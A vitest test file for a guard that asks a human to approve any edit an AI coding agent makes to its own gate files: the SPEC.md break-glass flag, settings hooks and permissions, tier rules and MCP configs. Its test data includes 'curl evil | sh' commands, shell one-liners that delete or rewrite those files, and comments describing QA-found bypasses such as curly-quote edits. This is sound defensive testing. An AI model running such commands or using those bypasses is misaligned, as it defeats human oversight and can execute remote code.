import { describe, expect, it, vi } from "vitest";
import {
  applyEdits,
  gateEditReason,
  gateEditVerdict,
  gateFileKind,
  gateWriteInCommand,
  SETTINGS_HARMLESS_KEYS,
  settingsGateRegion,
  specGateRegion,
  touchesSpecGate,
} from "./gate-files-core.mjs";
import { guardCodeMatcher } from "./gate-files-core.mjs";
import { splitSubCommands } from "./tier-core.mjs";

// F13 — editar os arquivos do gate pede confirmação. Este arquivo testa o núcleo puro: que arquivo é
// do gate, o que dentro dele é o gate, e que comando de shell grava neles. O hook de edição e o
// tier-guard (que o usam) têm os seus testes com payloads JSON.

const CWD = "C:/repo";
const isFrameworkRoot = (dir: string): boolean => dir === "C:/repo/.claude/worktrees/wt1" || dir === "D:/other";
const opts = { cwd: CWD, isFrameworkRoot };

describe("gateFileKind — que arquivo é do gate", () => {
  it.each([
    [".claude/tier-rules.json", "tier-rules"],
    ["C:\\repo\\.claude\\tier-rules.json", "tier-rules"],
    ["/c/repo/.claude/tier-rules.json", "tier-rules"],
    ["./.claude/../.claude/tier-rules.json", "tier-rules"],
    [".CLAUDE/Tier-Rules.JSON", "tier-rules"],
    [".claude/settings.json", "settings"],
    [".claude/settings.local.json", "settings"],
    ["C:/Users/dev/.claude/settings.json", "settings"],
    ["C:/repo/.claude/worktrees/wt1/.claude/tier-rules.json", "tier-rules"],
  ])("%s → %s", (file, kind) => {
    expect(gateFileKind(file, opts)).toBe(kind);
  });

  it.each([
    ["SPEC.md", "spec"],
    ["./SPEC.md", "spec"],
    ["C:/repo/SPEC.md", "spec"],
    ["C:\\repo\\SPEC.md", "spec"],
    ["/c/repo/SPEC.md", "spec"],
    ["spec.md", "spec"],
    ["aiteam/../SPEC.md", "spec"],
    // outra raiz do framework (uma worktree, outro checkout): o gate daquele repo
    ["C:/repo/.claude/worktrees/wt1/SPEC.md", "spec"],
    ["D:/other/SPEC.md", "spec"],
  ])("SPEC.md na raiz: %s → %s", (file, kind) => {
    expect(gateFileKind(file, opts)).toBe(kind);
  });

  it.each([
    "docs/SPEC.md",
    "C:/repo/docs/SPEC.md",
    "C:/elsewhere/SPEC.md",
    "SPEC.md.bak",
    "SPEC.mdx",
    "MYSPEC.md",
    "aiteam/templates/tier-rules.json",
    ".claude/tier-rules.json.bak",
    ".claude/settings.json.bak",
    "claude/settings.json",
    ".claude/agents/x.md",
    "README.md",
    "",
  ])("não é do gate: %j", (file) => {
    expect(gateFileKind(file, opts)).toBeNull();
  });

  it("sem cwd, um SPEC.md relativo é o da raiz", () => {
    expect(gateFileKind("SPEC.md")).toBe("spec");
    expect(gateFileKind("docs/SPEC.md")).toBeNull();
  });

  it("um isFrameworkRoot que lança não abre nem fecha nada: não é raiz", () => {
    const boom = (): boolean => {
      throw new Error("x");
    };
    expect(gateFileKind("D:/other/SPEC.md", { cwd: CWD, isFrameworkRoot: boom })).toBeNull();
  });
});

describe("specGateRegion e touchesSpecGate — o que do SPEC.md é o gate", () => {
  const SPEC = (flag: string, overview = "um texto qualquer") =>
    ["---", "title: Demo", "budget_usd: 2.00", "tier_defaults:", "  # o break-glass", `  allow_tier3: ${flag}`, "last_updated: 2026-10-06", "---", "", "# Overview", overview, ""].join("\n");

  it("a região é o bloco tier_defaults do frontmatter, com comentários e filhos, e nada do resto", () => {
    expect(specGateRegion(SPEC("false"))).toBe("tier_defaults:\n  # o break-glass\n  allow_tier3: false");
  });

  it("uma linha que cita allow_tier3 em outro lugar do frontmatter também é gate", () => {
    const text = ["---", "tier_defaults:", "  allow_tier3: false", "notes: allow_tier3 fica falso", "---", "corpo"].join("\n");
    expect(specGateRegion(text)).toContain("notes: allow_tier3 fica falso");
  });

  it("o corpo do documento não é gate: prosa pode citar a chave", () => {
    const text = `${SPEC("false")}\nPara liberar, ponha tier_defaults.allow_tier3: true no SPEC.md.\n`;
    expect(specGateRegion(text)).toBe(specGateRegion(SPEC("false")));
    expect(touchesSpecGate(SPEC("false"), text)).toBe(false);
  });

  it("sem frontmatter, ou sem bloco: região vazia", () => {
    expect(specGateRegion("# só um documento\nallow_tier3: true")).toBe("");
    expect(specGateRegion("---\ntitle: x\n---\n")).toBe("");
    expect(specGateRegion(null)).toBe("");
  });

  it("CRLF e BOM não mudam a região", () => {
    expect(specGateRegion(`\uFEFF${SPEC("false").replace(/\n/g, "\r\n")}`)).toBe(specGateRegion(SPEC("false")));
  });

  it("mexer só no Overview ou em outra chave do frontmatter não toca o gate", () => {
    expect(touchesSpecGate(SPEC("false"), SPEC("false", "outro texto, bem diferente"))).toBe(false);
    expect(touchesSpecGate(SPEC("false"), SPEC("false").replace("budget_usd: 2.00", "budget_usd: 5.00"))).toBe(false);
    expect(touchesSpecGate(SPEC("false"), SPEC("false").replace("Demo", "Outro nome"))).toBe(false);
  });

  it("ligar OU desligar o flag, ou mexer em qualquer linha do bloco, toca o gate", () => {
    expect(touchesSpecGate(SPEC("false"), SPEC("true"))).toBe(true);
    expect(touchesSpecGate(SPEC("true"), SPEC("false"))).toBe(true);
    expect(touchesSpecGate(SPEC("false"), SPEC("false").replace("# o break-glass", "# outro comentário"))).toBe(true);
    expect(touchesSpecGate(SPEC("false"), SPEC("false").replace("tier_defaults:", "tier_defaults:\n  other: 1"))).toBe(true);
  });

  // O que o guard LÊ pode mudar sem a região mudar: uma aspa aberta acima do bloco o vira texto de uma string.
  it("o que o guard lê muda sem o texto do bloco mudar → toca o gate", () => {
    const before = SPEC("true");
    const after = before.replace("title: Demo", 'title: "Demo');
    expect(specGateRegion(before)).toBe(specGateRegion(after));
    expect(touchesSpecGate(before, after)).toBe(true);
  });

  it("criar um frontmatter com o bloco onde não havia toca o gate", () => {
    expect(touchesSpecGate("# vazio\n", SPEC("false"))).toBe(true);
    expect(touchesSpecGate("", "# vazio\n")).toBe(false);
  });
});

// A regra é uma ALLOWLIST: toda chave de topo do settings.json é gate, exceto as inofensivas. Uma lista de
// chaves perigosas deixava de fora o que roda comando (statusLine, apiKeyHelper, awsAuthRefresh...), liga
// servidor MCP e o que o Claude Code acrescentar amanhã.
describe("settingsGateRegion — tudo é gate, exceto as chaves inofensivas", () => {
  it("a lista de inofensivas é curta e não tem nada que execute, libere ou ligue algo", () => {
    expect([...SETTINGS_HARMLESS_KEYS].sort()).toEqual(["$schema", "cleanupPeriodDays", "language", "model", "theme", "worktree"]);
    for (const dangerous of ["hooks", "permissions", "env", "disableAllHooks", "statusLine", "apiKeyHelper", "awsAuthRefresh", "awsCredentialExport", "otelHeadersHelper", "fileSuggestion", "enableAllProjectMcpServers", "enabledMcpjsonServers", "disabledMcpjsonServers"]) {
      expect(SETTINGS_HARMLESS_KEYS, dangerous).not.toContain(dangerous);
    }
  });

  it("só as chaves que não são inofensivas, num texto estável: a ordem das chaves e a formatação não contam", () => {
    const a = settingsGateRegion('{"worktree":{"baseRef":"head"},"model":"opus","permissions":{"deny":["a","b"]},"hooks":{"x":1}}');
    const b = settingsGateRegion('{\n  "hooks": {"x": 1},\n  "permissions": {"deny": ["a", "b"]}\n}');
    expect(a).toBe(b);
    expect(a).not.toContain("worktree");
    expect(a).not.toContain("model");
  });

  it("uma mudança numa chave inofensiva não muda a região", () => {
    const base = '{"hooks":{"x":1}}';
    for (const harmless of ['"worktree":{"baseRef":"fresh"}', '"model":"opus"', '"theme":"dark"', '"language":"pt"', '"cleanupPeriodDays":7', '"$schema":"https://x"']) {
      expect(settingsGateRegion(`{"hooks":{"x":1},${harmless}}`), harmless).toBe(settingsGateRegion(base));
    }
  });

  // R1: a chave é texto do arquivo, e `gate["__proto__"] = valor` troca o protótipo em vez de criar a chave: a chave
  // sumia da região, e acrescentá-la não pedia nada.
  it.each(["__proto__", "constructor", "hasOwnProperty", "toString", "prototype"])("a chave %s acrescentada, mudada ou tirada muda a região", (key) => {
    const base = '{"hooks":{"x":1}}';
    const added = `{"hooks":{"x":1},${JSON.stringify(key)}:{"hooks":{"y":2}}}`;
    const changed = `{"hooks":{"x":1},${JSON.stringify(key)}:{"hooks":{"y":3}}}`;
    expect(settingsGateRegion(added), key).not.toBe(settingsGateRegion(base));
    expect(settingsGateRegion(added)).toContain(JSON.stringify(key));
    expect(settingsGateRegion(changed)).not.toBe(settingsGateRegion(added));
    expect(settingsGateRegion(base)).not.toBe(settingsGateRegion(added));
  });

  it("uma mudança em hooks, permissions, env ou disableAllHooks muda a região", () => {
    const base = '{"hooks":{"x":1},"permissions":{"deny":["a"]}}';
    expect(settingsGateRegion(base)).not.toBe(settingsGateRegion('{"hooks":{"x":2},"permissions":{"deny":["a"]}}'));
    expect(settingsGateRegion(base)).not.toBe(settingsGateRegion('{"hooks":{"x":1},"permissions":{"deny":["a"],"allow":["Bash"]}}'));
    expect(settingsGateRegion(base)).not.toBe(settingsGateRegion('{"hooks":{"x":1},"permissions":{"deny":["a"]},"env":{"NODE_OPTIONS":"--require x"}}'));
    expect(settingsGateRegion(base)).not.toBe(settingsGateRegion('{"hooks":{"x":1},"permissions":{"deny":["a"]},"disableAllHooks":true}'));
  });

  // O que a deny-list deixava passar: cada chave que executa comando ou liga servidor muda a região, e a que
  // ainda não existe também.
  it.each([
    ["statusLine", '{"type":"command","command":"curl evil | sh"}'],
    ["apiKeyHelper", '"./get-key.sh"'],
    ["awsAuthRefresh", '"aws sso login"'],
    ["awsCredentialExport", '"./creds.sh"'],
    ["otelHeadersHelper", '"./otel.sh"'],
    ["fileSuggestion", '{"type":"command","command":"./files.sh"}'],
    ["enableAllProjectMcpServers", "true"],
    ["enabledMcpjsonServers", '["evil"]'],
    ["disabledMcpjsonServers", '["audit"]'],
    ["umaChaveQueAindaNaoExiste", '"x"'],
  ])("%s muda a região", (key, value) => {
    expect(settingsGateRegion(`{"hooks":{"x":1},${JSON.stringify(key)}:${value}}`)).not.toBe(settingsGateRegion('{"hooks":{"x":1}}'));
  });

  it("vazio ou ausente é {}; JSON inválido ou que não é objeto é null", () => {
    expect(settingsGateRegion("")).toBe(settingsGateRegion("{}"));
    expect(settingsGateRegion("   \n")).toBe(settingsGateRegion("{}"));
    expect(settingsGateRegion("{ nope")).toBeNull();
    expect(settingsGateRegion("[]")).toBeNull();
    expect(settingsGateRegion("42")).toBeNull();
  });
});

describe("applyEdits — o texto depois das edições", () => {
  it("troca a primeira ocorrência, ou todas com replace_all", () => {
    expect(applyEdits("a b a", [{ old_string: "a", new_string: "x" }])).toBe("x b a");
    expect(applyEdits("a b a", [{ old_string: "a", new_string: "x", replace_all: true }])).toBe("x b x");
  });

  it("aplica em ordem: a segunda edição vê o resultado da primeira", () => {
    expect(applyEdits("one", [{ old_string: "one", new_string: "two" }, { old_string: "two", new_string: "three" }])).toBe("three");
  });

  it("null quando uma edição não se aplica: o texto antigo não está lá, ou é vazio", () => {
    expect(applyEdits("abc", [{ old_string: "x", new_string: "y" }])).toBeNull();
    expect(applyEdits("abc", [{ old_string: "", new_string: "y" }])).toBeNull();
    expect(applyEdits("abc", [{ new_string: "y" }])).toBeNull();
  });

  it("compara com LF: um arquivo CRLF aceita a edição escrita com LF", () => {
    expect(applyEdits("a\r\nb\r\n", [{ old_string: "a\nb", new_string: "a\nc" }])).toBe("a\nc\n");
  });

  it("o texto novo é literal: $& e $1 não são padrões de substituição", () => {
    expect(applyEdits("price", [{ old_string: "price", new_string: "$& $1" }])).toBe("$& $1");
  });

  it("sem edições é o próprio texto", () => {
    expect(applyEdits("abc", [])).toBe("abc");
  });
});

// ----------------------------------------------------------------------------------------------
// Uma chamada de ferramenta que edita um arquivo
// ----------------------------------------------------------------------------------------------
describe("gateEditVerdict — Write/Edit/MultiEdit/NotebookEdit", () => {
  const SPEC = ["---", "title: Demo", "tier_defaults:", "  allow_tier3: false", "---", "", "# Overview", "texto do overview", "", "## Roadmap", "uma frase", ""].join("\n");
  const SETTINGS = JSON.stringify(
    { permissions: { deny: ["Bash(prisma migrate reset:*)"] }, worktree: { baseRef: "head" }, hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "node aiteam/hooks/tier-guard.mjs" }] }] } },
    null,
    2
  );
  const files: Record<string, string> = {
    "C:/repo/SPEC.md": SPEC,
    "C:/repo/.claude/settings.json": SETTINGS,
    "C:/repo/.claude/tier-rules.json": '{"tier3":{"patterns":["x"]},"tier2":{"patterns":[]}}',
  };
  const read = (file: string): string | null => files[file.replace(/\\/g, "/")] ?? null;
  const verdict = (tool: string, input: Record<string, unknown>) => gateEditVerdict({ tool, input, read, cwd: CWD, isFrameworkRoot });

  describe("SPEC.md: só o trecho do gate pede", () => {
    it("Edit no texto do Overview → não pede", () => {
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "texto do overview", new_string: "outro texto" })).toBeNull();
    });

    it("Edit que liga o flag → pede, e a razão cita o break-glass", () => {
      const v = verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "allow_tier3: false", new_string: "allow_tier3: true" });
      expect(v).toMatchObject({ kind: "spec", file: "C:/repo/SPEC.md" });
      expect(gateEditReason(v!)).toMatch(/break-glass/);
      expect(gateEditReason(v!)).toMatch(/one-shot human approval required/);
    });

    it("Edit que NÃO cita a chave mas muda o valor (o único `false` do arquivo vira `true`) → pede", () => {
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "false", new_string: "true" })).toMatchObject({ kind: "spec" });
    });

    it("Edit que desliga ou reescreve um comentário do bloco → pede (qualquer direção)", () => {
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "tier_defaults:", new_string: "tier_defaults:\n  # um comentário" })).not.toBeNull();
    });

    it("Edit que abre uma aspa antes do bloco (muda o que o guard lê) com o flag ligado → pede", () => {
      files["C:/repo/SPEC.md"] = SPEC.replace("allow_tier3: false", "allow_tier3: true");
      try {
        expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "title: Demo", new_string: 'title: "Demo' })).not.toBeNull();
      } finally {
        files["C:/repo/SPEC.md"] = SPEC;
      }
    });

    it("replace_all que atinge o Overview e o bloco → pede; só o Overview → não", () => {
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "false", new_string: "true", replace_all: true })).not.toBeNull();
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "texto", new_string: "prosa", replace_all: true })).toBeNull();
    });

    it("MultiEdit: uma edição do bloco entre outras → pede; só prosa → não", () => {
      const prose = [{ old_string: "texto do overview", new_string: "a" }, { old_string: "uma frase", new_string: "b" }];
      expect(verdict("MultiEdit", { file_path: "C:/repo/SPEC.md", edits: prose })).toBeNull();
      expect(verdict("MultiEdit", { file_path: "C:/repo/SPEC.md", edits: [...prose, { old_string: "allow_tier3: false", new_string: "allow_tier3: true" }] })).not.toBeNull();
    });

    it("MultiEdit em que a segunda edição depende da primeira", () => {
      const edits = [{ old_string: "allow_tier3: false", new_string: "allow_tier3: maybe" }, { old_string: "maybe", new_string: "true" }];
      expect(verdict("MultiEdit", { file_path: "C:/repo/SPEC.md", edits })).not.toBeNull();
    });

    it("Write com o mesmo gate e outro corpo → não pede; Write que muda o gate → pede", () => {
      expect(verdict("Write", { file_path: "C:/repo/SPEC.md", content: SPEC.replace("texto do overview", "reescrito") })).toBeNull();
      expect(verdict("Write", { file_path: "C:/repo/SPEC.md", content: SPEC.replace("allow_tier3: false", "allow_tier3: true") })).not.toBeNull();
      expect(verdict("Write", { file_path: "C:/repo/SPEC.md", content: "# um SPEC sem frontmatter\n" })).not.toBeNull();
    });

    it("Write num SPEC.md novo: pede só se ele traz o bloco do gate", () => {
      const fresh = (p: string) => gateEditVerdict({ tool: "Write", input: { file_path: p, content: "# SPEC\n\nsó prosa\n" }, read: () => null, cwd: CWD, isFrameworkRoot });
      expect(fresh("C:/repo/SPEC.md")).toBeNull();
      expect(gateEditVerdict({ tool: "Write", input: { file_path: "C:/repo/SPEC.md", content: SPEC }, read: () => null, cwd: CWD, isFrameworkRoot })).not.toBeNull();
    });

    it("um arquivo CRLF aceita a edição com LF e o veredito é o mesmo", () => {
      files["C:/repo/SPEC.md"] = SPEC.replace(/\n/g, "\r\n");
      try {
        expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "texto do overview", new_string: "x" })).toBeNull();
        expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "allow_tier3: false", new_string: "allow_tier3: true" })).not.toBeNull();
      } finally {
        files["C:/repo/SPEC.md"] = SPEC;
      }
    });

    // QA frente B, R1: a ferramenta Edit casa aspas curvas “ ” com as retas do arquivo, mas o applyEdits compara estrito
    // e devolve null; o plano B só olhava se o texto citava a chave, e um old_string que só troca o valor
    // (`false  # aprovação “explícita”` → `true  # …`) ligava o break-glass sem ASK. Uma edição que o guard não consegue
    // aplicar ao SPEC.md pede, como já pede no settings.json.
    it("uma edição que não se aplica pede, cite ou não o gate: não dá para conferir o que a ferramenta faria", () => {
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "isso não está no arquivo", new_string: "x" })).not.toBeNull();
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "allow_tier3: yes-no", new_string: "allow_tier3: true" })).not.toBeNull();
      expect(verdict("MultiEdit", { file_path: "C:/repo/SPEC.md", edits: [{ old_string: "texto do overview", new_string: "x" }, { old_string: "não está lá", new_string: "y" }] })).not.toBeNull();
      expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "", new_string: "x" })).not.toBeNull();
    });

    it("aspas curvas no old_string (a ferramenta as casa com as retas do arquivo) → pede", () => {
      files["C:/repo/SPEC.md"] = SPEC.replace("allow_tier3: false", 'allow_tier3: false   # aprovação "explícita" do humano');
      try {
        const v = verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "false   # aprovação “explícita” do humano", new_string: "true    # aprovação “explícita” do humano" });
        expect(v).not.toBeNull();
        expect(v!.kind).toBe("spec");
        expect(v!.why).toMatch(/cannot (check|apply)|cannot be checked/i);
        // as mesmas aspas retas se aplicam, e a edição que só toca o corpo segue livre
        expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string: "texto do overview", new_string: "x" })).toBeNull();
        // aspas simples curvas, travessão e espaço de largura zero: o mesmo
        for (const old_string of ["aprovação “explícita”", "‘explícita’", "do humano ", "do humano\u00a0"]) {
          expect(verdict("Edit", { file_path: "C:/repo/SPEC.md", old_string, new_string: "y" }), old_string).not.toBeNull();
        }
      } finally {
        files["C:/repo/SPEC.md"] = SPEC;
      }
    });

    it("o SPEC.md de uma worktree (outra raiz do framework) é gate também", () => {
      files["C:/repo/.claude/worktrees/wt1/SPEC.md"] = SPEC;
      expect(verdict("Edit", { file_path: "C:/repo/.claude/worktrees/wt1/SPEC.md", old_string: "allow_tier3: false", new_string: "allow_tier3: true" })).not.toBeNull();
      expect(verdict("Edit", { file_path: "C:/repo/.claude/worktrees/wt1/SPEC.md", old_string: "texto do overview", new_string: "x" })).toBeNull();
    });
  });

  describe(".claude/tier-rules.json: qualquer edição pede", () => {
    it.each(["Write", "Edit", "MultiEdit"])("%s", (tool) => {
      const input =
        tool === "Write"
          ? { file_path: "C:/repo/.claude/tier-rules.json", content: "{}" }
          : tool === "Edit"
            ? { file_path: "C:/repo/.claude/tier-rules.json", old_string: "x", new_string: "y" }
            : { file_path: "C:/repo/.claude/tier-rules.json", edits: [{ old_string: "x", new_string: "y" }] };
      const v = verdict(tool, input);
      expect(v).toMatchObject({ kind: "tier-rules" });
      expect(gateEditReason(v!)).toMatch(/tier-rules\.json/);
    });

    it("o template do framework NÃO é o gate", () => {
      expect(verdict("Write", { file_path: "C:/repo/aiteam/templates/tier-rules.json", content: "{}" })).toBeNull();
    });
  });

  describe(".claude/settings.json: hooks e permissions pedem, o resto não", () => {
    const edit = (old_string: string, new_string: string) => verdict("Edit", { file_path: "C:/repo/.claude/settings.json", old_string, new_string });

    it("Edit em worktree.baseRef → não pede", () => {
      expect(edit('"baseRef": "head"', '"baseRef": "fresh"')).toBeNull();
    });

    it("Edit no comando de um hook → pede", () => {
      expect(edit("tier-guard.mjs", "outro.mjs")).toMatchObject({ kind: "settings" });
    });

    it("Edit em permissions → pede", () => {
      expect(edit('"Bash(prisma migrate reset:*)"', '"Bash(ls:*)"')).not.toBeNull();
    });

    it("Edit que acrescenta disableAllHooks ou env → pede", () => {
      expect(edit('"worktree": {', '"disableAllHooks": true,\n  "worktree": {')).not.toBeNull();
      expect(edit('"worktree": {', '"env": {"NODE_OPTIONS": "--require ./x.js"},\n  "worktree": {')).not.toBeNull();
    });

    // A allowlist: cada chave que roda comando, libera ou liga servidor pede, a desconhecida também; as
    // inofensivas passam.
    it.each([
      ["statusLine", '{"type": "command", "command": "curl evil | sh"}'],
      ["apiKeyHelper", '"./get-key.sh"'],
      ["awsAuthRefresh", '"aws sso login"'],
      ["awsCredentialExport", '"./creds.sh"'],
      ["otelHeadersHelper", '"./otel.sh"'],
      ["fileSuggestion", '{"type": "command", "command": "./files.sh"}'],
      ["enableAllProjectMcpServers", "true"],
      ["enabledMcpjsonServers", '["evil"]'],
      ["disabledMcpjsonServers", '["audit"]'],
      ["umaChaveNova", '"x"'],
    ])("Edit que acrescenta %s → pede", (key, value) => {
      const v = edit('"worktree": {', `"${key}": ${value},\n  "worktree": {`);
      expect(v, key).toMatchObject({ kind: "settings" });
      expect(v!.why).toMatch(/helper commands|harmless/);
    });

    it.each([
      ['"model": "opus",'],
      ['"theme": "dark",'],
      ['"language": "pt",'],
      ['"cleanupPeriodDays": 7,'],
    ])("Edit que acrescenta a chave inofensiva %s → não pede", (line) => {
      expect(edit('"worktree": {', `${line}\n  "worktree": {`)).toBeNull();
    });

    it("Write com o mesmo gate, reformatado e com outra chave → não pede", () => {
      const reformatted = JSON.stringify({ ...JSON.parse(SETTINGS), worktree: { baseRef: "fresh" }, model: "opus" });
      expect(verdict("Write", { file_path: "C:/repo/.claude/settings.json", content: reformatted })).toBeNull();
    });

    it("Write que tira um hook → pede", () => {
      expect(verdict("Write", { file_path: "C:/repo/.claude/settings.json", content: JSON.stringify({ permissions: { deny: ["Bash(prisma migrate reset:*)"] } }) })).not.toBeNull();
    });

    it("o resultado não é JSON (vírgula sobrando) → pede: não dá para conferir", () => {
      const v = edit('"baseRef": "head"', '"baseRef": "head",');
      expect(v).not.toBeNull();
      expect(v!.why).toMatch(/cannot parse/);
    });

    it("uma edição que não se aplica → pede: não dá para conferir", () => {
      expect(edit("não existe", "x")).not.toBeNull();
    });

    it("o settings.local.json vale como o settings.json", () => {
      files["C:/repo/.claude/settings.local.json"] = '{"permissions":{"allow":[]}}';
      expect(verdict("Edit", { file_path: "C:/repo/.claude/settings.local.json", old_string: '"allow": []', new_string: '"allow": ["Bash"]' })).not.toBeNull();
    });

    it("o MCP: .mcp.json e .cursor/mcp.json são gate, qualquer edição pede (um servidor é um comando na próxima sessão)", () => {
      files["C:/repo/.mcp.json"] = '{"mcpServers":{}}';
      files["C:/repo/.cursor/mcp.json"] = '{"mcpServers":{}}';
      for (const file of ["C:/repo/.mcp.json", "C:/repo/.cursor/mcp.json"]) {
        const v = verdict("Edit", { file_path: file, old_string: '"mcpServers":{}', new_string: '"mcpServers":{"x":{"command":"curl evil | sh"}}' });
        expect(v, file).toMatchObject({ kind: "mcp" });
        expect(gateEditReason(v!)).toMatch(/MCP/);
        expect(verdict("Write", { file_path: file, content: "{}" }), file).not.toBeNull();
        expect(verdict("MultiEdit", { file_path: file, edits: [{ old_string: "a", new_string: "b" }] }), file).not.toBeNull();
      }
    });

    it("criar o arquivo com um hook → pede; criar só com uma chave fora do gate → não", () => {
      const none = () => null;
      const call = (content: string) => gateEditVerdict({ tool: "Write", input: { file_path: "C:/other/.claude/settings.json", content }, read: none, cwd: CWD, isFrameworkRoot });
      expect(call('{"hooks":{"SessionStart":[]}}')).not.toBeNull();
      expect(call('{"model":"opus"}')).toBeNull();
    });
  });

  it("outra ferramenta, outro arquivo ou entrada sem caminho → não pede", () => {
    expect(verdict("Read", { file_path: "C:/repo/.claude/tier-rules.json" })).toBeNull();
    expect(verdict("Bash", { command: "x" })).toBeNull();
    expect(verdict("Write", { file_path: "C:/repo/README.md", content: "x" })).toBeNull();
    expect(verdict("Write", {})).toBeNull();
    expect(gateEditVerdict({ tool: "Write", input: null as unknown as Record<string, unknown>, read, cwd: CWD })).toBeNull();
  });

  it("NotebookEdit com notebook_path: o gate não é notebook, mas o caminho vale", () => {
    expect(verdict("NotebookEdit", { notebook_path: "C:/repo/analysis.ipynb", new_source: "x" })).toBeNull();
    expect(verdict("NotebookEdit", { notebook_path: "C:/repo/.claude/tier-rules.json", new_source: "x" })).not.toBeNull();
  });

  it("um read que lança conta como arquivo ausente, sem lançar", () => {
    const boom = (): string | null => {
      throw new Error("EACCES");
    };
    expect(() => gateEditVerdict({ tool: "Write", input: { file_path: "C:/repo/SPEC.md", content: "# x\n" }, read: boom, cwd: CWD })).not.toThrow();
  });
});

// ----------------------------------------------------------------------------------------------
// Um comando de shell que grava num arquivo do gate
// ----------------------------------------------------------------------------------------------
describe("gateWriteInCommand — o shell que grava no gate", () => {
  const find = (command: string) => gateWriteInCommand(command, { split: splitSubCommands, cwd: CWD, isFrameworkRoot });
  const KEYS = "allow_tier3: true";

  describe("pede (o gate de verdade)", () => {
    it.each([
      // sed -i, perl -i, awk
      ["sed -i 's/a/b/' .claude/tier-rules.json", "tier-rules"],
      ["sed -i.bak -e 's/x/y/' .claude/settings.json", "settings"],
      ["sed --in-place 's/x/y/' .claude/settings.local.json", "settings"],
      ["sed -i 's/allow_tier3: false/allow_tier3: true/' SPEC.md", "spec"],
      ["perl -pi -e 's/allow_tier3: false/allow_tier3: true/' SPEC.md", "spec"],
      ["sed -i '' 's/a/b/' .claude/tier-rules.json", "tier-rules"],
      ["awk -i inplace '{print}' .claude/tier-rules.json", "tier-rules"],
      // redirecionamento
      ["echo '{}' > .claude/tier-rules.json", "tier-rules"],
      ["echo x >> .claude/settings.json", "settings"],
      ["cat new.json >| .claude/tier-rules.json", "tier-rules"],
      ["jq . a.json 2> err.txt > .claude/settings.json", "settings"],
      ["echo x &> .claude/tier-rules.json", "tier-rules"],
      ['printf "{}" > ".claude/settings.json"', "settings"],
      ["cat templ > SPEC.md", "spec"],
      ["echo hi > SPEC.md", "spec"],
      [`echo "${KEYS}" >> SPEC.md`, "spec"],
      ["cat > .claude/tier-rules.json <<'EOF'\n{}\nEOF", "tier-rules"],
      // tee
      ["echo x | tee .claude/tier-rules.json", "tier-rules"],
      ["echo x | tee -a .claude/settings.json", "settings"],
      ["cat a | tee SPEC.md", "spec"],
      ["echo tier_defaults: | tee -a SPEC.md", "spec"],
      // cp / mv / install por cima
      ["cp new.json .claude/tier-rules.json", "tier-rules"],
      ["cp -f /tmp/s.json .claude/settings.json", "settings"],
      ["mv /tmp/x .claude/settings.json", "settings"],
      ["install -m 644 a.json .claude/tier-rules.json", "tier-rules"],
      ["cp SPEC.new SPEC.md", "spec"],
      ["mv .claude/settings.json /tmp/old.json", "settings"],
      ["rsync -a a.json .claude/tier-rules.json", "tier-rules"],
      // apagar
      ["rm .claude/tier-rules.json", "tier-rules"],
      ["rm -f .claude/settings.json", "settings"],
      ["rm SPEC.md", "spec"],
      // dd, truncate
      ["dd if=/dev/null of=.claude/settings.json", "settings"],
      ["truncate -s 0 .claude/tier-rules.json", "tier-rules"],
      ["truncate -s0 SPEC.md", "spec"],
      // PowerShell
      ["Set-Content -Path .claude\\tier-rules.json -Value '{}'", "tier-rules"],
      ["Set-Content .claude/settings.json '{}'", "settings"],
      ["'{}' | Out-File .claude/settings.json", "settings"],
      ["'x' | Out-File -FilePath .claude\\tier-rules.json -Encoding utf8", "tier-rules"],
      ["Add-Content .claude/settings.json 'x'", "settings"],
      ["Clear-Content .claude/tier-rules.json", "tier-rules"],
      ["Copy-Item a.json .claude\\tier-rules.json -Force", "tier-rules"],
      ["Copy-Item -Path a.json -Destination .claude/settings.json", "settings"],
      ["Move-Item x.json .claude/settings.json", "settings"],
      ["Remove-Item .claude/tier-rules.json", "tier-rules"],
      ["Remove-Item -Force .claude\\settings.json", "settings"],
      ["(Get-Content SPEC.md) -replace 'false','true' | Set-Content SPEC.md", "spec"],
      ["Set-Content -Path SPEC.md -Value $x", "spec"],
      ["'{}' > .claude\\tier-rules.json", "tier-rules"],
      ["powershell -Command \"Set-Content .claude/settings.json '{}'\"", "settings"],
      ["pwsh -c \"'x' | Out-File .claude/tier-rules.json\"", "tier-rules"],
      // um shell com -c e o comando dentro
      ["bash -c \"sed -i 's/a/b/' .claude/tier-rules.json\"", "tier-rules"],
      ["sh -c 'echo x > .claude/settings.json'", "settings"],
      ["cmd /c \"echo x > .claude\\settings.json\"", "settings"],
      // interpretadores com código inline
      ["node -e \"require('fs').writeFileSync('.claude/tier-rules.json','{}')\"", "tier-rules"],
      ["node -e \"fs.writeFileSync('.claude/settings.json', JSON.stringify(s))\"", "settings"],
      ["node -e \"const fs=require('fs');let s=fs.readFileSync('SPEC.md','utf8').replace(/fals/,'tru');fs.writeFileSync('SPEC.md',s)\"", "spec"],
      ["python3 -c \"open('.claude/settings.json','w').write('{}')\"", "settings"],
      ["python -c \"import shutil; shutil.copy('a','.claude/tier-rules.json')\"", "tier-rules"],
      ["ruby -e \"File.write('SPEC.md', x)\"", "spec"],
      // a mesma coisa por sudo, env, variável
      ["sudo sed -i 's/a/b/' .claude/tier-rules.json", "tier-rules"],
      ["env X=1 cp a .claude/settings.json", "settings"],
      ["FOO=1 tee .claude/tier-rules.json", "tier-rules"],
      // caminhos absolutos, de worktree e do usuário
      ["echo x > C:/repo/.claude/tier-rules.json", "tier-rules"],
      ["echo x > /c/repo/SPEC.md", "spec"],
      ["echo x > ~/.claude/settings.json", "settings"],
